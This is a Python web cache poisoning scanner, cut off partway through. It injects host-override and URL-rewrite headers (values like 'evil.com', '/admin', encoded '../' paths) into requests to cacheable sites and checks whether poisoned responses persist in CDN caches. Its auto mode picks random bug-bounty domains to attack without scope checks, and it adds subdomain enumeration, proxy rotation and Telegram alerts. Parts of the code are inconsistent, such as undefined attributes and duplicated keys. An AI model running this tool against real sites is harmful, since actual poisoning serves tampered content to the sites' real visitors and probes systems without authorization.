#!/usr/bin/env python3
import argparse
import requests
import time
import json
import sys
import random
import subprocess
import urllib3
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin
import logging
from typing import List, Dict, Optional, Set, Tuple, NamedTuple
from requests.exceptions import RequestException
import os
from datetime import datetime
from dataclasses import dataclass
import hashlib
import difflib
import uuid
import statistics
from urllib.parse import parse_qs
from contextlib import redirect_stdout, redirect_stderr
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

@dataclass
class CacheValidation:
    is_cached: bool
    cache_headers: Dict[str, str]
    cache_type: Optional[str]
    ttl: Optional[int]
    vary_headers: List[str]

@dataclass 
class PoisonEvidence:
    reflected_headers: Dict[str, str]
    poisoned_headers: Dict[str, str]
    content_changes: Dict[str, float]  
    cache_status: CacheValidation
    verification_requests: List[Dict]

@dataclass
class PoisonResult:
    is_vulnerable: bool
    confidence: float
    evidence: PoisonEvidence
    payload: Dict
    response: requests.Response

@dataclass
class CacheFingerprint:
    name: str
    headers: List[str]
    patterns: List[str]
    vary_behavior: Dict[str, str]
    ttl_patterns: List[str]
    poisoning_vectors: List[str]

@dataclass
class ValidationResult:
    success: bool
    confidence: float
    evidence: Dict
    error: Optional[str] = None

@dataclass
class CacheKeyAnalysis:
    components: List[str]
    sensitivity: Dict[str, float]
    variations: List[str]
    normalized_key: str

@dataclass
class AdvancedPoisonCheck:
    is_poisoned: bool
    confidence: float
    technique: str
    evidence: Dict
    verification_count: int
    false_positive_score: float

@dataclass
class TimingAnalysis:
    baseline_timing: float
    response_timings: List[float]
    timing_pattern: str
    anomaly_score: float

@dataclass
class HeaderAnalysis:
    reflected_count: int
    reflection_patterns: Dict[str, List[str]]
    injection_points: List[str]
    risk_score: float

@dataclass
class ResponseChain:
    original: requests.Response
    poisoned: requests.Response
    verifications: List[requests.Response]
    timing_deltas: List[float]
    cache_hits: int
    chain_broken: bool

class CachePoisonUI:
    def __init__(self):
        self.silent = bool(os.getenv('SILENT_MODE', False))
    
    def log(self, message: str):
        if not self.silent:
            print(f"[*] {message}")

    def error(self, message: str):
        if not self.silent:
            print(f"[!] {message}")

    def success(self, message: str):
        if not self.silent:
            print(f"[+] {message}")

class CachePoisonDetector:
    def __init__(self, target_url: str = None, threads: int = 10, timeout: int = 10, 
                 proxy_list_url: str = None, auto_mode: bool = False, 
                 enable_subdomain_enum: bool = False, notifications_disabled: bool = False):
        self.ui = CachePoisonUI()
        self.target_url = target_url
        self.threads = threads
        self.timeout = timeout
        self.auto_mode = auto_mode
        self.enable_subdomain_enum = enable_subdomain_enum
        self.notifications_disabled = notifications_disabled
        self.results = []
        self.proxy_list = []
        self.request_delay = 1.5
        self.max_requests_per_minute = 30
        self.last_request_time = 0
        self.cache_indicators = set()
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)
        
        if proxy_list_url:
            try:
                response = requests.get(proxy_list_url)
                self.proxy_list = [{'http': f'http://{proxy.strip()}'} for proxy in response.text.split('\n') if proxy.strip()]
            except Exception as e:
                logging.error(f"Failed to load proxy list: {e}")

        self.init_payloads()
        
        if not self.target_url and self.auto_mode:
            self.targets = self.get_random_targets()
        else:
            self.targets = [self.target_url] if self.target_url else []

        if self.enable_subdomain_enum:
            self.all_targets = self.get_suitable_targets()
        else:
            self.all_targets = self.targets

        self.min_verification_requests = 20
        self.verification_intervals = [2, 5, 10, 20, 30, 45, 60, 90, 120, 180, 240, 300]
        self.min_confidence_threshold = 0.985
        self.similarity_threshold = 0.997
        self.max_dynamic_ratio = 0.015
        self.required_validation_passes = 11
        
        self.chain_break_threshold = 0.1
        self.min_cache_hit_ratio = 0.95
        self.max_timing_variance = 0.2

        self.timing_thresholds = {
            'anomaly': 2.0,
            'variance': 0.3
        }
        
        self.reflection_patterns = self.init_reflection_patterns()
        self.injection_signatures = self.init_injection_signatures()
        self.false_positive_patterns = self.init_fp_patterns()

        self.init_enhanced_fingerprints()

        self.cache_key_variations = self.generate_cache_key_variations()
        self.poisoning_techniques = self.load_poisoning_techniques()

    def init_payloads(self):
        self.base_domains = [
            'evil.com',
            'attacker.com',
            'cache.evil.com',
            'poison.evil.com',
            'internal.evil.com'
        ]
        
        self.path_payloads = [
            '/admin',
            '/internal',
            '/api',
            '/.env',
            '/config',
            '/dashboard'
        ]
        
        self.test_headers = {
            'Host': self.base_domains,
            'X-Forwarded-Host': self.base_domains,
            'X-Host': self.base_domains,
            'X-Forwarded-Server': self.base_domains,
            'X-HTTP-Host-Override': self.base_domains,
            'X-Original-Host': self.base_domains,
            'X-Backend-Host': self.base_domains,
            
            'X-Forwarded-Proto': ['http', 'https', 'ws', 'wss'],
            'X-Forwarded-Scheme': ['http', 'https', 'ws', 'wss'],
            'X-URL-Scheme': ['http', 'https'],
            
            'X-Original-URL': self.path_payloads,
            'X-Rewrite-URL': self.path_payloads,
            'X-Override-URL': self.path_payloads,
            
            'X-Cache-Key': self.base_domains,
            'X-Cache-Hash': self.base_domains,
            'X-Cache-Vary': ['accept-encoding,host,x-forwarded-host'],
            
            'CF-Connecting-IP': ['127.0.0.1', '192.168.0.1'],
            'Fastly-SSL': ['1'],
            'Akamai-Origin-Hop': ['1'],
            'CDN-Loop': ['cloudflare'],
            
            'X-Frame-Options': ['ALLOW-FROM evil.com'],
            'Content-Security-Policy': ['connect-src evil.com'],
            'Access-Control-Allow-Origin': self.base_domains
        }

    def is_cacheable_response(self, response: requests.Response) -> bool:
        cache_indicators = {
            'Cache-Control': lambda x: any(d in x.lower() for d in ['public', 'max-age', 's-maxage']),
            'X-Cache': lambda x: True,
            'X-Cache-Hit': lambda x: True,
            'Age': lambda x: int(x) > 0 if x.isdigit() else False,
            
            'CF-Cache-Status': lambda x: x.upper() != 'BYPASS',
            'X-Varnish': lambda x: True,
            'X-Drupal-Cache': lambda x: True,
            'X-Fastly-Cache': lambda x: True,
            'Fastly-Debug-Digest': lambda x: True,
            'X-Cache-Hits': lambda x: int(x) > 0 if x.isdigit() else False,
            'X-CDN': lambda x: True,
            
            'X-Azure-Ref': lambda x: True,
            'X-Served-By': lambda x: True,
            'X-Cache-Key': lambda x: True
        }

        for header, validator in cache_indicators.items():
            if header in response.headers:
                try:
                    if validator(response.headers[header]):
                        self.cache_indicators.add(header)
                        return True
                except Exception:
                    continue

        return False

    def analyze_cacheability(self, url: str) -> Tuple[bool, Dict]:
        try:
            resp1 = self.make_request(url)
            if not resp1:
                return False, {}

            is_cacheable = self.is_cacheable_response(resp1)
            if not is_cacheable:
                return False, {}

            time.sleep(2)
            resp2 = self.make_request(url)
            if not resp2:
                return False, {}

            cache_info = {
                'cache_headers': list(self.cache_indicators),
                'cache_time': int(resp1.headers.get('Age', 0)),
                'varies_header': resp1.headers.get('Vary', ''),
                'cache_control': resp1.headers.get('Cache-Control', ''),
                'server': resp1.headers.get('Server', ''),
                'cdn_info': self.detect_cdn(resp1)
            }

            return True, cache_info

        except Exception as e:
            self.logger.error(f"Error analyzing cacheability for {url}: {e}")
            return False, {}

    def detect_cdn(self, response: requests.Response) -> str:
        cdn_indicators = {
            'Cloudflare': ['cf-ray', 'cf-cache-status'],
            'Akamai': ['x-akamai-transformed'],
            'Fastly': ['fastly-debug-digest', 'x-served-by'],
            'Varnish': ['x-varnish'],
            'CloudFront': ['x-amz-cf-id'],
            'Azure CDN': ['x-azure-ref'],
            'Google Cloud CDN': ['x-goog-cache']
        }

        for cdn, headers in cdn_indicators.items():
            if any(h in response.headers for h in headers):
                return cdn
        return 'Unknown'

    def get_suitable_targets(self) -> List[str]:
        all_targets = []
        
        if not self.enable_subdomain_enum:
            return self.targets
            
        raw_targets = self.enumerate_subdomains()
        
        self.logger.info(f"Analyzing {len(raw_targets)} potential targets for cacheability...")
        
        for target in raw_targets:
            try:
                url = f"https://{target}"
                is_cacheable, cache_info = self.analyze_cacheability(url)
                
                if not is_cacheable:
                    url = f"http://{target}"
                    is_cacheable, cache_info = self.analyze_cacheability(url)
                
                if is_cacheable:
                    self.logger.info(f"Found suitable target: {url}")
                    self.logger.debug(f"Cache info: {json.dumps(cache_info, indent=2)}")
                    all_targets.append({
                        'url': url,
                        'cache_info': cache_info
                    })
            
            except Exception as e:
                self.logger.error(f"Error analyzing target {target}: {e}")
                continue
        
        sorted_targets = sorted(
            all_targets,
            key=lambda x: len(x['cache_info']['cache_headers']),
            reverse=True
        )
        
        return [t['url'] for t in sorted_targets]

    def get_random_targets(self, num_targets: int = 3) -> List[str]:
        try:
            response = requests.get('https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/wildcards.txt')
            all_targets = [t.strip().replace('*.', '') for t in response.text.split('\n') if t.strip()]
            
            valid_targets = [t for t in all_targets if not t.startswith('*') and '.' in t]
            return random.sample(valid_targets, min(num_targets, len(valid_targets)))
            
        except Exception as e:
            self.logger.error(f"Failed to get random targets: {e}")
            return []

    def enumerate_subdomains(self) -> List[str]:
        all_subdomains = []
        
        for target in self.targets:
            try:
                self.logger.info(f"Enumerating subdomains for {target}")
                result = subprocess.run(
                    ['subfinder', '-d', target, '-silent', '-recursive'],
                    capture_output=True,
                    text=True
                )
                
                subdomains = [
                    sub.strip() 
                    for sub in result.stdout.split('\n') 
                    if sub.strip()
                ]
                
                self.logger.info(f"Found {len(subdomains)} subdomains for {target}")
                all_subdomains.extend(subdomains)
                
            except Exception as e:
                self.logger.error(f"Subfinder failed for {target}: {e}")
                
        return all_subdomains if all_subdomains else self.targets

    def apply_rate_limiting(self):
        current_time = time.time()
        time_since_last_request = current_time - self.last_request_time
        
        if time_since_last_request < (60 / self.max_requests_per_minute):
            sleep_time = (60 / self.max_requests_per_minute) - time_since_last_request
            time.sleep(sleep_time)
        
        self.last_request_time = time.time()

    def get_random_proxy(self):
        return random.choice(self.proxy_list) if self.proxy_list else None

    def handle_rate_limiting(self, response: requests.Response) -> bool:
        rate_limit_indicators = {
            'status_code': [429, 503],
            'headers': [
                'retry-after',
                'x-ratelimit-remaining',
                'x-ratelimit-reset'
            ],
            'body_patterns': [
                r'rate\s*limit',
                r'too\s*many\s*requests',
                r'throttl(ed|ing)',
                r'quota\s*exceeded'
            ]
        }
        
        if response.status_code in rate_limit_indicators['status_code']:
            return True
            
        for header in rate_limit_indicators['headers']:
            if header.lower() in [h.lower() for h in response.headers]:
                return True
            
        for pattern in rate_limit_indicators['body_patterns']:
            if re.search(pattern, response.text, re.I):
                return True
            
        return False

    def make_request(self, url: str, headers: Dict = None) -> Optional[requests.Response]:
        self.apply_rate_limiting()
        
        max_retries = 3
        retry_delay = 5
        
        for attempt in range(max_retries):
            try:
                proxy = self.get_random_proxy()
                response = requests.get(
                    url,
                    headers=headers,
                    proxies=proxy,
                    timeout=self.timeout,
                    allow_redirects=False,
                    verify=False
                )
                
                if self.handle_rate_limiting(response):
                    if attempt < max_retries - 1:
                        time.sleep(retry_delay * (attempt + 1))
                        continue
                    return None
                    
                return response
                
            except Exception as e:
                self.logger.debug(f"Request failed (attempt {attempt + 1}): {str(e)}")
                if attempt < max_retries - 1:
                    time.sleep(retry_delay)
                
        return None

    def check_response_similarity(self, resp1: requests.Response, resp2: requests.Response) -> float:
        if not resp1 or not resp2:
            return 0.0
            
        if resp1.status_code != resp2.status_code:
            return 0.5
            
        len1 = len(resp1.text)
        len2 = len(resp2.text)
        if abs(len1 - len2) > (max(len1, len2) * 0.1):
            return 0.7
            
        common_headers = set(resp1.headers.keys()) & set(resp2.headers.keys())
        header_diff = sum(resp1.headers[h] != resp2.headers[h] for h in common_headers)
        if header_diff > 0:
            return 0.8
            
        return 1.0

    def send_telegram_notification(self, result: Dict):
        if hasattr(self, 'notifications_disabled') and self.notifications_disabled:
            return
        
        try:
            token = os.getenv('TELEGRAM_BOT_TOKEN')
            chat_id = os.getenv('TELEGRAM_CHAT_ID')
            
            if not token or not chat_id:
                return
                
            serializable_result = self.prepare_result_for_output(result)
            
            message = f"""🚨 Cache Poisoning Vulnerability Found

Target: `{serializable_result['url']}`
CDN: `{serializable_result.get('cache_info', {}).get('cdn_info', 'Unknown')}`

Vulnerable Headers: 
```json
{json.dumps(serializable_result.get('vulnerable_headers', {}), indent=2)}
```

Cache Info:
```json
{json.dumps(serializable_result.get('cache_info', {}), indent=2)}
```

Evidence:
```json
{json.dumps(serializable_result.get('evidence', {}), indent=2)}
```

Timestamp: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`
"""
            
            encoded_message = urllib.parse.quote(message)
            
            curl_cmd = [
                'curl',
                '-s',
                '-X', 'POST',
                f'https://api.telegram.org/bot{token}/sendMessage',
                '-d', f'chat_id={chat_id}',
                '-d', f'text={encoded_message}',
                '-d', 'parse_mode=Markdown'
            ]
            
            subprocess.run(curl_cmd, 
                          stdout=subprocess.DEVNULL, 
                          stderr=subprocess.DEVNULL)
                
        except Exception as e:
            self.logger.error(f"Failed to send notification: {str(e)}")

    def test_header_combination(self, headers: Dict[str, str]) -> Optional[Dict]:
        try:
            control_resp = self.make_request(self.target_url)
            if not control_resp or not self.is_cacheable_response(control_resp):
                return None

            poison_resp = self.make_request(self.target_url, headers)
            if not poison_resp:
                return None

            time.sleep(random.uniform(2.0, 3.0))
            verify_resps = []
            for _ in range(3):
                verify_resp = self.make_request(self.target_url)
                if verify_resp:
                    verify_resps.append(verify_resp)
                time.sleep(1)

            if not verify_resps:
                return None

            evidence = self.analyze_poison_evidence(
                control_resp,
                poison_resp,
                verify_resps,
                headers
            )

            if evidence['is_vulnerable']:
                result = {
                    'url': self.target_url,
                    'vulnerable_headers': headers,
                    'evidence': evidence,
                    'cache_info': {
                        'headers': dict(poison_resp.headers),
                        'status_codes': [r.status_code for r in verify_resps],
                        'cache_keys': list(self.cache_indicators)
                    }
                }
                
                self.send_telegram_notification(result)
                return result

        except Exception as e:
            self.logger.error(f"Error testing headers {headers}: {str(e)}")
            
        return None

    def analyze_poison_evidence(
        self,
        control_resp: requests.Response,
        poison_resp: requests.Response,
        verify_resps: List[requests.Response],
        test_headers: Dict[str, str]
    ) -> Dict:
        evidence = {
            'is_vulnerable': False,
            'poisoned_response': None,
            'payload': None
        }

        if not self.validate_responses(control_resp, poison_resp, verify_resps):
            return evidence

        if not self.is_definitely_cached(control_resp, verify_resps):
            return evidence

        poisoning_result = self.verify_precise_poisoning(
            control_resp,
            poison_resp,
            verify_resps,
            test_headers
        )
        
        if poisoning_result['confirmed']:
            evidence.update({
                'is_vulnerable': True,
                'poisoned_response': poisoning_result['response'],
                'payload': poisoning_result['payload']
            })

        return evidence

    def is_definitely_cached(self, control_resp: requests.Response, verify_resps: List[requests.Response]) -> bool:
        cache_headers = {
            'CF-Cache-Status': {'HIT'},
            'X-Cache': {'HIT', 'TCP_HIT'},
            'X-Varnish': None,
            'Age': None,
            'X-Cache-Hits': None
        }

        cache_indicators = 0
        for header, valid_values in cache_headers.items():
            if header in control_resp.headers:
                if valid_values is None:
                    if header == 'Age' and int(control_resp.headers[header] or 0) > 0:
                        cache_indicators += 1
                    elif header == 'X-Cache-Hits' and int(control_resp.headers[header] or 0) > 0:
                        cache_indicators += 1
                    else:
                        cache_indicators += 1
                elif control_resp.headers[header] in valid_values:
                    cache_indicators += 1

        for resp in verify_resps:
            resp_indicators = 0
            for header, valid_values in cache_headers.items():
                if header in resp.headers:
                    if valid_values is None or resp.headers[header] in valid_values:
                        resp_indicators += 1
            
            if resp_indicators != cache_indicators:
                return False

        return cache_indicators > 0

    def verify_precise_poisoning(
        self,
        control_resp: requests.Response,
        poison_resp: requests.Response,
        verify_resps: List[requests.Response],
        test_headers: Dict[str, str]
    ) -> Dict:
        result = {
            'confirmed': False,
            'response': None,
            'payload': None
        }

        poison_identifiers = self.extract_poison_indicators(poison_resp, test_headers)
        
        confirmed_responses = []
        for resp in verify_resps:
            if self.confirm_poison_indicators(resp, poison_identifiers):
                confirmed_responses.append(resp)

        if len(confirmed_responses) >= 2:
            result.update({
                'confirmed': True,
                'response': confirmed_responses[0],
                'payload': {
                    'headers': test_headers,
                    'indicators': poison_identifiers
                }
            })

        return result

    def extract_poison_indicators(self, resp: requests.Response, test_headers: Dict[str, str]) -> Set[str]:
        indicators = set()
        
        for header, value in test_headers.items():
            if value in resp.text:
                indicators.add(f"reflected:{value}")
        
        for header, value in test_headers.items():
            if header in resp.headers and value in resp.headers[header]:
                indicators.add(f"header_modified:{header}={value}")

        return indicators

    def confirm_poison_indicators(self, resp: requests.Response, indicators: Set[str]) -> bool:
        for indicator in indicators:
            indicator_type, value = indicator.split(':', 1)
            
            if indicator_type == 'reflected':
                if value not in resp.text:
                    return False
            elif indicator_type == 'header_modified':
                header, expected = value.split('=', 1)
                if header not in resp.headers or expected not in resp.headers[header]:
                    return False

        return True

    def validate_responses(self, control_resp, poison_resp, verify_resps) -> bool:
        if not all([control_resp, poison_resp] + verify_resps):
            return False
        
        valid_codes = {200, 301, 302, 307, 308}
        if not all(r.status_code in valid_codes for r in [control_resp, poison_resp] + verify_resps):
            return False
        
        error_indicators = ['error', 'exception', 'not found', 'forbidden']
        if any(any(ind in r.text.lower() for ind in error_indicators) 
               for r in [control_resp, poison_resp] + verify_resps):
            return False
        
        return True

    def scan(self) -> List[Dict]:
        try:
            header_combinations = self.generate_header_combinations()
            total_combinations = len(header_combinations)
            results = []
            
            self.ui.log(f"Testing {total_combinations} payload combinations...")
            
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = []
                for headers in header_combinations:
                    futures.append(executor.submit(self.test_header_combination, headers))
                
                for i, future in enumerate(as_completed(futures), 1):
                    self.ui.log(f"Progress: {i}/{total_combinations}")
                    result = future.result()
                    if result:
                        serializable_result = self.prepare_result_for_output(result)
                        results.append(serializable_result)
                        self.send_telegram_notification(serializable_result)
            
            return results
            
        except Exception as e:
            self.logger.error(f"Scan error: {str(e)}")
            return []

    def scan_all(self) -> List[Dict]:
        self.ui.log("Starting cache poison scan...")
        
        if not self.target_url and not self.auto_mode:
            self.ui.error("No target specified. Use -u/--url or --auto")
            return []
        
        if self.auto_mode and not self.target_url:
            self.targets = self.get_random_targets(3)
            if not self.targets:
                self.ui.error("Failed to get random targets")
                return []
            self.ui.log(f"Selected targets: {', '.join(self.targets)}")
        elif self.target_url:
            if not self.target_url.startswith(('http://', 'https://')):
                self.target_url = f'https://{self.target_url}'
            self.targets = [self.target_url]
        
        if not self.enable_subdomain_enum:
            self.ui.log("Subdomain enumeration disabled, using direct targets...")
            self.all_targets = self.targets
        else:
            self.ui.log("Starting subdomain enumeration...")
            self.all_targets = self.get_suitable_targets()
            self.ui.log(f"Total targets after enumeration: {len(self.all_targets)}")

        self.ui.log("Analyzing targets for cacheability...")
        cacheable_targets = []
        
        for target in self.all_targets:
            try:
                is_cacheable, cache_info = self.analyze_cacheability(target)
                if is_cacheable:
                    cacheable_targets.append((target, cache_info))
                    self.ui.success(f"Found cacheable target: {target} via {cache_info['cdn_info']}")
            except Exception as e:
                self.ui.error(f"Error analyzing {target}: {e}")
        
        if not cacheable_targets:
            self.ui.error("No cacheable targets found")
            return []
        
        self.targets = [t[0] for t in cacheable_targets]
        all_results = []
        total_targets = len(self.targets)
        
        for idx, target in enumerate(self.targets, 1):
            try:
                self.ui.log(f"Testing target ({idx}/{total_targets}): {target}")
                self.target_url = target
                
                results = self.scan()
                if results:
                    self.ui.success(f"Found {len(results)} vulnerabilities!")
                    all_results.extend(results)
                else:
                    self.ui.log("No vulnerabilities found")
                    
            except Exception as e:
                self.ui.error(f"Error scanning {target}: {e}")
                continue
        
        self.display_summary(all_results)
        return all_results

    def display_vulnerability(self, result: Dict):
        print(f"Target: {result['url']}")
        print(f"\nPayload:")

    def display_summary(self, results: List[Dict]):
        print(f"\nTotal Targets Scanned: {len(self.targets)}")
        print(f"Vulnerabilities Found: {len(results)}")


    def generate_header_combinations(self) -> List[Dict[str, str]]:
        combinations = []
        
        for header, values in self.test_headers.items():
            if isinstance(values, list):
                for value in values:
                    combinations.append({header: value})
            else:
                combinations.append({header: values})
        
        common_pairs = [
            ('X-Forwarded-Host', 'X-Forwarded-Proto'),
            ('X-Forwarded-Host', 'X-Forwarded-Scheme'),
            ('Host', 'X-Forwarded-For'),
            ('X-Original-URL', 'X-Forwarded-Host'),
            ('X-Rewrite-URL', 'X-Forwarded-Host'),
            ('X-Original-Host', 'X-Forwarded-Proto'),
        ]
        
        for header1, header2 in common_pairs:
            if header1 in self.test_headers and header2 in self.test_headers:
                values1 = self.test_headers[header1]
                values2 = self.test_headers[header2]
                
                if not isinstance(values1, list):
                    values1 = [values1]
                if not isinstance(values2, list):
                    values2 = [values2]
                
                for v1 in values1:
                    for v2 in values2:
                        combinations.append({
                            header1: v1,
                            header2: v2
                        })
        
        cdn_combinations = {
            'Cloudflare': [
                {'CF-Connecting-IP': '127.0.0.1', 'X-Forwarded-For': '127.0.0.1'},
                {'CF-Connecting-IP': '127.0.0.1', 'X-Forwarded-Host': 'evil.com'},
            ],
            'Fastly': [
                {'Fastly-SSL': '1', 'X-Forwarded-Host': 'evil.com'},
                {'Fastly-SSL': '1', 'X-Original-URL': '/admin'},
            ],
            'Akamai': [
                {'Akamai-Origin-Hop': '1', 'X-Forwarded-Host': 'evil.com'},
                {'True-Client-IP': '127.0.0.1', 'X-Forwarded-Host': 'evil.com'},
            ]
        }
        
        if hasattr(self, 'current_cdn'):
            if self.current_cdn in cdn_combinations:
                combinations.extend(cdn_combinations[self.current_cdn])
        
        path_traversal = [
            '/admin',
            '/../admin',
            '/../../admin',
            '/%2e%2e/admin',
            '/.%2e/admin'
        ]
        
        for path in path_traversal:
            combinations.append({
                'X-Original-URL': path,
                'X-Rewrite-URL': path
            })
        
        cache_busters = [
            {'Cache-Control': 'no-cache'},
            {'Pragma': 'no-cache'},
            {'X-Cache-Hash': 'evil.com'},
            {'X-Cache-Vary': 'accept-encoding,host,x-forwarded-host'}
        ]
        combinations.extend(cache_busters)
        
        self.logger.debug(f"Generated {len(combinations)} header combinations to test")
        return combinations

    def init_enhanced_fingerprints(self):
        self.cache_fingerprints = {
            'Cloudflare': CacheFingerprint(
                name='Cloudflare',
                headers=['CF-Cache-Status', 'CF-RAY', 'CF-POPing'],
                patterns=['cloudflare'],
                vary_behavior={
                    'host': 'sensitive',
                    'accept-encoding': 'ignored',
                    'user-agent': 'partial'
                },
                ttl_patterns=[
                    r'max-age=(\d+)',
                    r's-maxage=(\d+)'
                ],
                poisoning_vectors=[
                    'x-forwarded-host',
                    'x-original-url',
                    'x-host'
                ]
            ),
            'Varnish': CacheFingerprint(
                name='Varnish',
                headers=['X-Varnish', 'Via', 'X-Cache'],
                patterns=['varnish'],
                vary_behavior={
                    'host': 'sensitive',
                    'accept-encoding': 'sensitive',
                    'cookie': 'ignored'
                },
                ttl_patterns=[
                    r'max-age=(\d+)',
                    r'stale-while-revalidate=(\d+)'
                ],
                poisoning_vectors=[
                    'x-forwarded-host',
                    'x-forwarded-scheme',
                    'x-forwarded-proto'
                ]
            ),
        }

    def verify_poison(self, control_resp: requests.Response,
                     poison_resp: requests.Response,
                     test_headers: Dict[str, str]) -> PoisonResult:
        verification_results = []
        
        for _ in range(self.min_verification_requests):
            time.sleep(random.uniform(self.cache_verification_delay, self.cache_verification_delay * 1.5))
            verify_resp = self.make_request()
            if verify_resp:
                cache_validation = self.validate_cache_behavior(verify_resp)
                if not cache_validation.is_cached:
                    continue
                    
                verification_results.append({
                    'response': verify_resp,
                    'cache_validation': cache_validation,
                    'normalized_content': self.normalize_response(verify_resp)
                })

        if len(verification_results) < self.min_verification_requests:
            return PoisonResult(
                is_vulnerable=False,
                confidence=0.0,
                evidence=None,
                payload=test_headers,
                response=poison_resp
            )

        control_content = self.normalize_response(control_resp)
        poison_content = self.normalize_response(poison_resp)
        
        evidence = PoisonEvidence(
            reflected_headers=self.find_reflected_headers(test_headers, verification_results[0]['response']),
            poisoned_headers={},
            content_changes={},
            cache_status=verification_results[0]['cache_validation'],
            verification_requests=verification_results
        )

        confidence_factors = {
            'cache_consistency': self.validate_cache_consistency(verification_results) * 0.3,
            'response_similarity': self.validate_response_similarity(poison_content, verification_results) * 0.3,
            'header_reflection': self.validate_header_reflection(test_headers, verification_results) * 0.2,
            'error_absence': (not any(self.is_error_page(r['response']) for r in verification_results)) * 0.1,
            'cache_hit_ratio': (sum(1 for r in verification_results if r['cache_validation'].is_cached) / len(verification_results)) * 0.1
        }

        advanced_check = self.validate_poisoning_attempt(
            control_resp,
            poison_resp,
            [r['response'] for r in verification_results],
            "standard",
            test_headers
        )

        confidence = (sum(confidence_factors.values()) + advanced_check.confidence) / 2

        is_vulnerable = (confidence >= self.min_confidence_threshold and 
                        advanced_check.is_poisoned)

        if is_vulnerable:
            evidence.poisoned_headers = {
                header: value for header, value in test_headers.items()
                if header in evidence.reflected_headers
            }
            evidence.content_changes = {
                header: self.calculate_similarity(control_content, poison_content)
                for header in evidence.poisoned_headers
            }

        return PoisonResult(
            is_vulnerable=is_vulnerable,
            confidence=confidence,
            evidence=evidence,
            payload=test_headers,
            response=verification_results[0]['response']
        )

    def validate_cache_consistency(self, verification_results: List[Dict]) -> float:
        cache_types = set(r['cache_validation'].cache_type for r in verification_results)
        cache_headers = set(frozenset(r['cache_validation'].cache_headers.items()) 
                          for r in verification_results)
        
        if len(cache_types) != 1 or len(cache_headers) != 1:
            return 0.0
            
        return 1.0

    def validate_response_similarity(self, poison_content: str, 
                                  verification_results: List[Dict]) -> float:
        similarity_scores = [
            self.calculate_similarity(poison_content, r['normalized_content'])
            for r in verification_results
        ]
        
        return min(similarity_scores)

    def generate_payloads(self) -> List[Dict]:
        base_domains = [
            'evil.com',
            'attacker.com',
            f'cache-{int(time.time())}.evil.com'
        ]

        headers = {
            'Host': base_domains,
            'X-Forwarded-Host': base_domains,
            'X-Host': base_domains,
            'X-Forwarded-Server': base_domains,
            'X-HTTP-Host-Override': base_domains,
            'X-Forwarded-Proto': ['http', 'https'],
            'X-Forwarded-Scheme': ['http', 'https'],
            'X-Cache-Key': base_domains,
            'Fastly-Debug': ['1'],
            'X-Akamai-Cache-Key': base_domains,
            'X-Varnish-Host': base_domains,
            'CF-Connecting-IP': ['127.0.0.1'],
            'X-Real-IP': ['127.0.0.1'],
            'X-Original-URL': ['/admin', '/internal'],
            'X-Rewrite-URL': ['/admin', '/internal'],
            'CF-Connecting-IP': ['127.0.0.1'],
            'X-Real-IP': ['127.0.0.1'],
            'X-Original-URL': ['/admin', '/internal'],
            'X-Rewrite-URL': ['/admin', '/internal']
        }

        payloads = []
        for header, values in headers.items():
            for value in values:
                payloads.append({header: value})

        common_pairs = [
            ('X-Forwarded-Host', 'X-Forwarded-Proto'),
            ('Host', 'X-Forwarded-Proto'),
            ('X-Forwarded-Host', 'X-Cache-Key')
        ]

        for header1, header2 in common_pairs:
            if header1 in headers and header2 in headers:
                for v1 in headers[header1]:
                    for v2 in headers[header2]:
                        payloads.append({
                            header1: v1,
                            header2: v2
                        })

        return payloads

    def analyze_cache_key_components(self, response: requests.Response) -> CacheKeyAnalysis:
        components = []
        sensitivity = {}
        variations = []
        
        headers = response.headers
        url_parts = urlparse(response.url)
        
        if 'Vary' in headers:
            vary_headers = [h.strip() for h in headers['Vary'].split(',')]
            components.extend(vary_headers)
            
            for header in vary_headers:
                sensitivity[header] = self.test_header_sensitivity(response.url, header)
        
        if url_parts.query:
            params = parse_qs(url_parts.query)
            for param in params:
                components.append(f"param:{param}")
                sensitivity[f"param:{param}"] = self.test_param_sensitivity(response.url, param)
        
        normalized_key = self.generate_normalized_cache_key(components, sensitivity)
        
        variations = self.generate_key_variations(components, sensitivity)
        
        return CacheKeyAnalysis(
            components=components,
            sensitivity=sensitivity,
            variations=variations,
            normalized_key=normalized_key
        )

    def test_header_sensitivity(self, url: str, header: str) -> float:
        original_resp = self.make_request(url)
        if not original_resp:
            return 0.0
            
        test_values = [
            f"test-{int(time.time())}", 
            "different-value",
            f"cache-{uuid.uuid4()}"
        ]
        
        different_responses = 0
        total_tests = len(test_values)
        
        for value in test_values:
            headers = {header: value}
            test_resp = self.make_request(url, headers)
            if test_resp and self.is_different_cached_response(original_resp, test_resp):
                different_responses += 1
                
        return different_responses / total_tests

    def validate_poisoning_attempt(self, original_resp: requests.Response,
                                    poison_resp: requests.Response,
                                    verification_resps: List[requests.Response],
                                    technique: str,
                                    test_headers: Dict[str, str]) -> AdvancedPoisonCheck:
        chain_analysis = self.analyze_response_chain([original_resp, poison_resp] + verification_resps)
        if chain_analysis.chain_broken:
            return AdvancedPoisonCheck(
                is_poisoned=False,
                confidence=0.0,
                technique=technique,
                evidence={'error': 'Response chain broken'},
                verification_count=len(verification_resps),
                false_positive_score=1.0
            )

        content_stability = self.check_content_stability(verification_resps)
        if content_stability < 0.85:
            return AdvancedPoisonCheck(
                is_poisoned=False,
                confidence=0.0,
                technique=technique,
                evidence={'error': 'Unstable content detected'},
                verification_count=len(verification_resps),
                false_positive_score=1.0
            )

        if self.has_excessive_dynamic_content(verification_resps):
            return AdvancedPoisonCheck(
                is_poisoned=False,
                confidence=0.0,
                technique=technique,
                evidence={'error': 'Excessive dynamic content'},
                verification_count=len(verification_resps),
                false_positive_score=1.0
            )

        validation_scores = {
            'cache_persistence': self.validate_cache_persistence(verification_resps) * 0.25,
            'content_consistency': self.validate_content_consistency(poison_resp, verification_resps) * 0.20,
            'header_reflection': self.validate_header_reflection_impact(poison_resp.headers, verification_resps) * 0.15,
            'error_detection': self.validate_error_absence(verification_resps) * 0.10,
            'cdn_specific': self.validate_cdn_behavior(verification_resps) * 0.10,
            'cache_key_match': self.validate_cache_key_match(original_resp, poison_resp, verification_resps) * 0.10,
